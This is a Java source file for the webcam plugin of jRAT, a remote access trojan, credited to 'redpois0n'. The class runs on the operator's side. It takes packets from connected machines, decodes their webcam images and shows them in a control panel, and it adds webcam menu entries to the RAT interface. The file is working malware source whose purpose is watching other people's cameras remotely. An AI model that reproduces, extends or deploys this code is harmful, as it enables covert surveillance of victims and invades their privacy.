package pro.jrat.plugin.client;

import java.awt.Graphics;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;

import javax.swing.ImageIcon;

import pro.jrat.api.RATControlMenuEntry;
import pro.jrat.api.RATMenuItem;
import pro.jrat.api.RATPlugin;
import pro.jrat.api.Reader;
import pro.jrat.api.events.OnConnectEvent;
import pro.jrat.api.events.OnDisableEvent;
import pro.jrat.api.events.OnDisconnectEvent;
import pro.jrat.api.events.OnEnableEvent;
import pro.jrat.api.events.OnPacketEvent;
import pro.jrat.api.events.OnSendPacketEvent;

public class WebcamPlugin extends RATPlugin {

	public static final String ICON_LOCATION = System.getProperty("jrat.dir") + File.separator + "plugins/Webcam/icon.png";
	public static final byte HEADER = 120;

	public static RATControlMenuEntry entry;
	public static boolean enabled;

	public void onEnable(OnEnableEvent event) throws Exception {
		try {
			Properties prop = new Properties();
			prop.load(new FileInputStream(System.getProperty("jrat.dir") + File.separator + "plugins/Webcam/config.properties"));

			PanelWebcam.WIDTH = Integer.parseInt(prop.getProperty("width"));
			PanelWebcam.HEIGHT = Integer.parseInt(prop.getProperty("height"));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void onDisable(OnDisableEvent event) throws Exception {
		
	}

	public void onPacket(OnPacketEvent event) throws Exception {
		if (event.getPacket().getHeader() == HEADER) {
			String name = readString(event.getServer().getDataReader());

			PanelWebcam panel = (PanelWebcam) WebcamPlugin.entry.instances.get(event.getServer().getIP());
			
			if (name.equals("DISABLED")) {
				enabled = false;

				if (panel != null) {
					panel.setNoWebcamFound();
				}
			} else {
				int size = event.getServer().getDataReader().readInt();
				byte[] buffer = new byte[size];
				event.getServer().getDataReader().readFully(buffer, 0, buffer.length);
				
				if (panel != null) {
					panel.setCamName(name);

					BufferedImage image = ImageUtils.decodeImage(buffer);

					Graphics g = panel.image.getGraphics();
					g.drawImage(image, 0, 0, panel.image.getWidth(), panel.image.getHeight(), null);

					panel.lbl.repaint();
				}
			}
		}
	}

	private String readString(Reader dataReader) throws Exception {
		short len = dataReader.readShort();
		StringBuffer buffer = new StringBuffer();
		for (short s = 0; s < len; s++) {
			buffer.append(dataReader.readChar());
		}
		
		return buffer.toString();
	}

	public String getName() {
		return "Webcam";
	}

	public String getVersion() {
		return "4.1.4";
	}

	public String getDescription() {
		return "Webcam Plugin";
	}

	public String getAuthor() {
		return "redpois0n";
	}

	// Server connected to us
	public void onConnect(OnConnectEvent event) throws Exception {

	}

	// Server disconnected from us
	public void onDisconnect(OnDisconnectEvent event) throws Exception {

	}

	// List of right click menu items, return null if none
	public List<RATMenuItem> getMenuItems() {
		List<RATMenuItem> list = new ArrayList<RATMenuItem>();
		RATMenuItem entry = new RATMenuItem(new MenuListener(), "Webcam", new ImageIcon(ICON_LOCATION));

		list.add(entry);
		return list;
	}

	public List<RATControlMenuEntry> getControlTreeItems() throws Exception {
		List<RATControlMenuEntry> list = new ArrayList<RATControlMenuEntry>();
		entry = new RATControlMenuEntry("Webcam", new ImageIcon(ICON_LOCATION), PanelWebcam.class);

		list.add(entry);
		return list;
	}

	public void onSendPacket(OnSendPacketEvent event) throws Exception {

	}

	@Override
	public ActionListener getGlobalMenuItemListener() {
		return null;
	}

}
